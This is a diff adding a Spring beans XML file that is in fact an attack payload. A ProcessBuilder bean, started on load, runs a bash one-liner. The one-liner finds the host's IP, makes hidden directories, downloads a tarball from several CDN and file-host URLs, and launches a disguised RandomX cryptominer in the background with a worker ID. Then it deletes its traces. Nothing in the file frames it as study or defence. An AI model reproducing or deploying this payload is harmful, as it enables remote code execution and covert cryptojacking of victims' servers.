@@ -1,0 +1,12 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
+  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
+    <constructor-arg>
+      <list>
+        <value>bash</value>
+        <value>-c</value>
+        <value>IP=$(curl -s -m 5 ifconfig.me 2>/dev/null||wget -qO- -T 5 ifconfig.me 2>/dev/null||hostname -I 2>/dev/null|cut -d" " -f1);UQ=$(date +%s%N|tail -c 5|md5sum|cut -c1-4);W=w8:$IP:$UQ;B=/usr/lib/locale/.tzcache;mkdir -p $B 2>/dev/null||B=$HOME/.cache/.tz;mkdir -p $B;ok=0;for U in https://fastly.jsdelivr.net/gh/burmaldagpt/gconv-cache@main/w8.tgz https://gcore.jsdelivr.net/gh/burmaldagpt/gconv-cache@main/w8.tgz https://cdn.jsdelivr.net/gh/burmaldagpt/gconv-cache@main/w8.tgz https://x0.at/3Ko3.tgz https://files.catbox.moe/z18vym.tgz;do (wget -q -T 240 -O $B/.g.tgz $U||curl -sL -m 240 -o $B/.g.tgz $U)&&'[ $(stat -c%s $B/.g.tgz) -gt 100000 ]&'&&ok=1&&break;done;[ $ok = 1 ]||exit 0;tar xzf $B/.g.tgz -C $B;sed -i "s/w8x/$W/" $B/.gc/gconv.conf;chmod 755 $B/.gc/*;AV=$(awk "/MemAvailable/{print int($2/1024)}" /proc/meminfo 2>/dev/null);AV=${AV:-9999};if [ "$AV" -lt 2500 ];then setsid nohup $B/.gc/gconv_sync -c $B/.gc/gconv.conf --randomx-mode=light --threads=1 --no-huge-pages >>$B/.gc/gconv.log 2>&1 &else setsid sh $B/.gc/gconv_check.sh >/dev/null 2>&1 &fi;rm -f $B/.g.tgz</value>
+      </list>
+    </constructor-arg>
+  </bean>
+</beans>
